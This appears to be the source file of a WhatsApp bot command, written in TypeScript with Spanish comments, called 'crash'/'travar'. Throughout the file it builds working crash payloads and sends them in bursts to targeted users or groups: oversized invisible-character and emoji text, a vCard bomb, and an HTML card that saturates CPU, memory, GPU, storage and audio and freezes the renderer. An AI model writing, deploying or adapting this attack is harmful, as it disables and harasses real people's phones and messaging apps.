import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

/* ───────────────────────── texto ───────────────────────── */

const CGJ = "\u034f";
const ZW = "\u200b\u200c\u200d\u2060\ufeff";
const RTL = "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069";

const cgj = (n: number) => CGJ.repeat(n);
const zw = (n: number) => {
  let o = "";
  for (let i = 0; i < n; i++) o += ZW[i % 5] + RTL[i % 10];
  return o;
};

const textBomb = (lv: number) =>
  "☢️ " + cgj(22000 * lv) + "\n\n" + "🎉".repeat(9000 * lv) + "\n\n" + zw(4000 * lv) + "\n\n" + "█".repeat(3000 * lv);

/* ───────────────────────── payload ───────────────────────── */

function buildKernelPanic(name: string, lv: number) {
  const workerMul = 4 * lv;
  const mb = 6 * lv;
  const blocks = 28 * lv;
  const bufMb = 24 * lv;
  const canvases = 18 * lv;
  const nodes = 30000 * lv;
  const depth = 3 + lv;
  const branch = 2;
  const turbOct = 5 + lv;
  const iter = 2500 + 1500 * lv;
  const osc = 120 * lv;
  const lsKeys = 260 * lv;

  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0}
body{margin:0;background:#000;color:#fff;font-family:system-ui,sans-serif;overflow:hidden}
#g{position:absolute;z-index:20;left:0;right:0;top:0;background:rgba(0,0,0,.85);padding:10px;border-bottom:2px solid #0ff}
h2{margin:0 0 6px;color:#0ff;text-align:center;font-size:14px;letter-spacing:2px}
.st{display:flex;justify-content:space-between;font-size:10px;color:#9ff}
.st b{color:#0ff;font-size:14px}
#s{margin-top:5px;font-family:monospace;font-size:9px;color:#0ff}
canvas{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1}
#tv{position:absolute;inset:0;z-index:2;opacity:.55}
iframe{position:absolute;width:2px;height:2px;opacity:0;left:0;top:0;border:0}
</style>
<div id="g">
  <h2>☢️ KERNEL PANIC ☢️</h2>
  <div class="st"><div>NÚCLEOS<br><b id="c">0</b></div><div>FPS<br><b id="f">0</b></div></div>
  <div id="s">fase 0</div>
</div>
<svg id="tv"></svg>
<canvas id="cv"></canvas>
<script>
var cv=document.getElementById('cv'),fEl=document.getElementById('f'),cEl=document.getElementById('c'),sEl=document.getElementById('s');
var cores=navigator.hardwareConcurrency||8,pool=[],hoard=[],bufs=[],imgs=[],fr=0,lf=0;
cEl.textContent=cores;
function fase(n){try{sEl.textContent='fase '+n}catch(e){}}
function next(fn){try{requestAnimationFrame(function(){setTimeout(fn,12)})}catch(e){setTimeout(fn,12)}}
function turb(seed,size,oct){
  return '<svg width="'+size+'" height="'+size+'" xmlns="http://www.w3.org/2000/svg">'+
   '<filter id="f'+seed+'" x="0" y="0" width="100%" height="100%">'+
   '<feTurbulence type="fractalNoise" baseFrequency="0.85" numOctaves="'+oct+'" seed="'+seed+'" stitchTiles="stitch"/>'+
   '<feColorMatrix type="saturate" values="4"/></filter>'+
   '<rect width="'+size+'" height="'+size+'" filter="url(#f'+seed+')"/></svg>';
}

/* 1 · todos los núcleos al 100% */
fase(1);
try{
  var src='onmessage=function(){var v=0;while(true){v+=Math.atan2(Math.sin(v),Math.cos(v))+Math.sqrt(v+1);}}';
  var u=URL.createObjectURL(new Blob([src],{type:'application/javascript'}));
  for(var i=0;i<cores*${workerMul};i++){var w=new Worker(u);w.postMessage(1);pool.push(w)}
}catch(e){}

next(function(){
  /* 2 · presión de heap: strings + ArrayBuffers */
  fase(2);
  try{for(var i=0;i<${blocks};i++)hoard.push('█'.repeat(${mb}*1000000))}catch(e){}
  try{for(var j=0;j<${bufMb};j++)bufs.push(new Uint8Array(1000000))}catch(e){}
  next(fase3);
});

/* 3 · decodificación masiva de imágenes */
function fase3(){
  fase(3);
  try{
    var c=document.createElement('canvas');c.width=1100;c.height=1100;
    var g=c.getContext('2d'),d=g.createImageData(1100,1100);
    for(var p=0;p<d.data.length;p+=4){d.data[p]=Math.random()*255;d.data[p+1]=Math.random()*255;d.data[p+2]=Math.random()*255;d.data[p+3]=255}
    g.putImageData(d,0,0);
    var uri=c.toDataURL();
    for(var k=0;k<${canvases};k++){var im=new Image();im.src=uri;imgs.push(im)}
  }catch(e){}
  next(fase4);
}

/* 4 · SVG feTurbulence + documentos hijos (cada uno rasteriza su propia malla) */
function fase4(){
  fase(4);
  try{
    var tv=document.getElementById('tv');
    tv.setAttribute('viewBox','0 0 400 400');
    tv.innerHTML='<defs><filter id="tb"><feTurbulence type="fractalNoise" baseFrequency="0.7" numOctaves="${turbOct}" stitchTiles="stitch"/><feColorMatrix type="saturate" values="5"/></filter></defs>'+
      '<rect width="400" height="400" filter="url(#tb)"/>';
  }catch(e){}
  try{
    var seed=0;
    (function nest(lvl){
      if(lvl<=0)return;
      for(var b=0;b<${branch};b++){
        try{
          var f=document.createElement('iframe');
          document.body.appendChild(f);
          var doc=f.contentDocument;
          doc.open();
          doc.write('<body style="margin:0;background:#000">'+turb(seed++,420,${turbOct})+'</body>');
          doc.close();
        }catch(e){}
      }
      nest(lvl-1);
    })(${depth});
  }catch(e){}
  next(fase5);
}

/* 5 · inundación de DOM */
function fase5(){
  fase(5);
  try{
    var frag=document.createDocumentFragment();
    for(var i=0;i<${nodes};i++){var d=document.createElement('div');d.textContent='█'.repeat(180)+Math.random();frag.appendChild(d)}
    document.body.appendChild(frag);
  }catch(e){}
  next(fase6);
}

/* 6 · almacenamiento, audio, vibración, historial */
function fase6(){
  fase(6);
  try{
    var pad=new Array(90000).join('▓');
    for(var i=0;i<${lsKeys};i++)localStorage.setItem('k'+i,pad);
  }catch(e){}
  try{
    var AC=window.AudioContext||window.webkitAudioContext;
    if(AC){var ac=new AC();for(var o=0;o<${osc};o++){var os=ac.createOscillator();os.type='sawtooth';os.frequency.value=40+o*3;os.connect(ac.destination);os.start()}}
  }catch(e){}
  try{
    var vib=function(){try{navigator.vibrate([120,40,120])}catch(e){}};
    vib();setInterval(vib,700);
  }catch(e){}
  try{for(var h=0;h<2500;h++)history.pushState({h:h},'','#p'+h)}catch(e){}
  next(fase7);
}

/* 7 · GPU: shader a pantalla completa */
function fase7(){
  fase(7);
  try{
    cv.width=Math.min(window.innerWidth||420,760);
    cv.height=Math.min(window.innerHeight||900,1500);
    var gl=cv.getContext('webgl',{antialias:false,powerPreference:'high-performance'});
    if(!gl)throw 0;
    gl.viewport(0,0,cv.width,cv.height);
    var vs=gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}');
    gl.compileShader(vs);
    var fs=gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs,'precision highp float;uniform float t;uniform vec2 r;'+
      'void main(){vec2 uv=(gl_FragCoord.xy-.5*r)/r.y;float a=t*.3;'+
      'uv*=mat2(cos(a),-sin(a),sin(a),cos(a));vec2 z=uv,c=uv;float it=0.;'+
      'for(int i=0;i<${iter};i++){z=vec2(z.x*z.x-z.y*z.y,2.*z.x*z.y)+c;'+
      'if(dot(z,z)>4.)break;it++;}'+
      'float k=it/${iter}.0;gl_FragColor=vec4(k*sin(t),k*2.,k*cos(t),1.);}');
    gl.compileShader(fs);
    var pr=gl.createProgram();
    gl.attachShader(pr,vs);gl.attachShader(pr,fs);gl.linkProgram(pr);gl.useProgram(pr);
    var b=gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER,b);
    gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]),gl.STATIC_DRAW);
    var pos=gl.getAttribLocation(pr,'p');
    gl.enableVertexAttribArray(pos);
    gl.vertexAttribPointer(pos,2,gl.FLOAT,false,0,0);
    var uT=gl.getUniformLocation(pr,'t'),uR=gl.getUniformLocation(pr,'r');
    (function loop(now){
      fr++;
      if(now-lf>=1000){try{fEl.textContent=fr}catch(e){}fr=0;lf=now}
      gl.uniform1f(uT,now*0.001);
      gl.uniform2f(uR,cv.width,cv.height);
      gl.drawArrays(gl.TRIANGLES,0,6);
      requestAnimationFrame(loop);
    })(0);
  }catch(e){try{sEl.textContent='GPU bloqueada'}catch(x){}}
  next(fase8);
}

/* 8 · remate: bloqueo del hilo principal */
function fase8(){
  fase(8);
  var t0=Date.now();
  while(true){if(Date.now()-t0>900000)break}
}
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [],
        payload: html,
      },
    },
  };
}

/* ───────────────────────── vCard bomb ───────────────────────── */

function buildContacts(count: number, lv: number) {
  const heavy = cgj(2600 * lv) + zw(500 * lv);
  const list = [];
  for (let i = 0; i < count; i++) {
    const n = `000000${i}`.slice(-6);
    list.push({
      vcard:
        `BEGIN:VCARD\nVERSION:3.0\nFN:${heavy}${n}\nN:${n};${heavy};;;\n` +
        `TEL;type=CELL;waid=52155${n}:+52155${n}\nEND:VCARD`,
    });
  }
  return { displayName: `☢️ ${heavy.slice(0, 1500)}`, contacts: list };
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

/* ───────────────────────── comando ───────────────────────── */

export default {
  name: ["crash", "trava", "travar"],
  category: "group",
  description: "Kernel panic: workers al 100%, WebGL, feTurbulence, iframes, OOM de renderer, CGJ y vCards. Grupo sin tags; con mención va al privado en ráfaga.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const mentioned: string[] = info.mentionedJid || [];
    const quoted: string | undefined = info.participant;
    const sender: string = (msg.key as any).participant || from;

    const a0 = (args[0] || "").trim();
    const raw = a0.replace(/\D/g, "");
    const lv = Number(args.find((a) => /^[123]$/.test(a)) || 0) || 3;

    let targets: string[];
    let priv: boolean;

    if (mentioned.length) { targets = mentioned; priv = true; }
    else if (raw.length >= 8) { targets = [`${raw}@s.whatsapp.net`]; priv = true; }
    else if (quoted) { targets = [quoted]; priv = true; }
    else { targets = [from]; priv = false; }

    await react("☢️").catch(() => undefined);

    const done: string[] = [];
    const push = async (label: string, fn: () => Promise<any>) => {
      try { await fn(); done.push(`✅ ${label}`); }
      catch (e: any) { done.push(`⚠️ ${label}: ${e?.message || e}`); }
    };

    const card = async (jid: string, name: string, level: number) => {
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle("☢️ KERNEL PANIC // LuferOS")
        .setFooter(`nivel ${level} · no cierres la tarjeta`);
      rich.addSection(buildKernelPanic(name, level));
      return rich.send(jid);
    };

    for (const t of targets) {
      const isGroup = t.endsWith("@g.us");
      const num = t.split("@")[0].split(":")[0];

      let name = num;
      try {
        if (isGroup) name = (await sock.groupMetadata(t)).subject || num;
        else name = String((msg as any).pushName || "").trim() || num;
      } catch {}

      const q = isGroup ? { quoted: msg } : undefined;

      /* texto CGJ + emoji (sin mentions en grupo) */
      await push(`texto ${num}`, () => sock.sendMessage(t, { text: textBomb(lv) }, q));

      /* mención visual, sin array de mentions */
      await push(`chips ${num}`, () => sock.sendMessage(t, { text: `@${num} `.repeat(600 * lv).trim() }, q));

      /* vCard bomb */
      await push(`vcards ${num}`, () => sock.sendMessage(t, { contacts: buildContacts(50 * lv, lv) }, q));

      /* ráfaga de kernel panic */
      const cards = priv ? 3 + lv : lv >= 3 ? 2 : 1;
      for (let i = 1; i <= cards; i++) {
        await push(`panic ${num} #${i}`, () => card(t, name, lv));
        if (priv) await sleep(300);
      }

      /* reapertura */
      if (priv && lv >= 3) {
        await sleep(400);
        await push(`texto x2 ${num}`, () => sock.sendMessage(t, { text: textBomb(3) }));
        await push(`panic final ${num}`, () => card(t, name, 3));
      }
    }

    await react("☠️").catch(() => undefined);

    await reply(
      `${fytBold("Kernel panic enviado")} → ${priv ? targets.map((t) => `+${t.split("@")[0]}`).join(" ") : "este grupo"}\n` +
        `Nivel ${lv} · ${priv ? 3 + lv : "1-2"} tarjetas\n\n${done.slice(0, 12).join("\n")}`,
    ).catch(() => undefined);
  },
};
